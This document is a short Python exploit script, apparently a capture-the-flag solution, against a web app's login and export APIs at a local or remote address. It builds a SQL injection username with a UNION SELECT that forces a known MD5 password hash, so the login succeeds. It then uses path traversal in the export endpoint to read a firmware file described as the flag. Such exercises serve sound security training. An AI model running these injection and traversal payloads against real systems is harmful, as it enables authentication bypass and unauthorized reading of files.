import requests
import json
import hashlib
import sys

if "--remote" in sys.argv:
    URL = "http://178.62.9.10:31500"
else:
    URL = "http://127.0.0.1:1337"


HEADERS = {"Content-Type": "application/json"}


def login(session, username, password):
    url = "%s/api/login" % URL

    payload = {}
    payload["username"] = username
    payload["password"] = password
    payload = json.dumps(payload)

    r = session.post(url, data=payload, headers=HEADERS)
    return r.text


def export(session, name):
    url = "%s/api/export" % URL

    payload = {}
    payload["name"] = name
    payload = json.dumps(payload)

    r = session.post(url, data=payload, headers=HEADERS)
    return r.text


session = requests.Session()
password = "admin"
password_hashed = hashlib.md5(password.encode()).hexdigest()
print(password_hashed)
username = 'john" UNION SELECT username, "%s" as password FROM users LIMIT 1 -- ' % password_hashed

# Login
res = login(session, username, password)
assert "Success" in res

# Test export
res = export(session, "communication.mp3")
assert len(res) != 0
expected = res

res = export(session, "../communications/communication.mp3")
assert res == expected

# Read flag
res = export(session, "../signal_sleuth_firmware")
print(res)
